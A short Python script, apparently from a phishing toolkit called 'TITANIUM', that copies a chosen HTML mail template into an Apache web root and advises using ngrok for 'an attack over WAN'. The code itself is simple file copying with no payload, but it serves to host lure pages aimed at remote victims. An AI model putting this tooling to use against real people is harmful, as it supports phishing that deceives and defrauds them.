import shutil
from Core.Support import Font
import os


def main():
    nome = input(
        "\nINSERT THE NAME OF YOUR HTML MAIL-TEMPLATE" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
    direc = os.getcwd() + "/Server/CUSTOM/" + nome
    dest = "/var/www/html"
    shutil.copytree(direc, dest, dirs_exist_ok=True)
    print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "FILE ADDED TO YOUR WEBSERVER: " + dest)
    print(
        Font.Color.GREEN + "\n[+]" + Font.Color.YELLOW + "FOR AN ATTACK OVER WAN USE NGROK AND BEFORE STARTING YOU SHOULD ENABLE APACHE SERVICES")
    inp = input("\nPRESS ENTER TO CONTINUE...")
    os.system("cls" if os.name == "nt" else "clear")